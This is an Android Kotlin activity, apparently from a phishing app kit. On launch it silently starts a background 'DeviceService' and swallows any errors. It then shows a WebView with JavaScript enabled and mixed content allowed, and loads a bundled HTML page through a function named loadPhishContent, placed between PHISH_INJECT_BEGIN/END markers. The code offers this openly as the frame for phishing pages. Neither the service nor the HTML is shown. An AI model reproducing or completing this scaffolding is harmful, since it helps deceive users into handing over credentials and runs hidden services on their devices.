package com.sync.xxx

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Base64
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        try {
            val svc = Intent(this, DeviceService::class.java)
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(svc)
            } else {
                startService(svc)
            }
        } catch (_: Exception) {
        }

        webView = findViewById(R.id.webview)
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webView.webViewClient = WebViewClient()
        loadPhishContent()
    }

    private fun loadPhishContent() {
        // PHISH_INJECT_BEGIN
        try {
            val html = assets.open("default_home.html").bufferedReader().readText()
            webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
        } catch (e: Exception) {
            webView.loadUrl("about:blank")
        }
        // PHISH_INJECT_END
    }
}
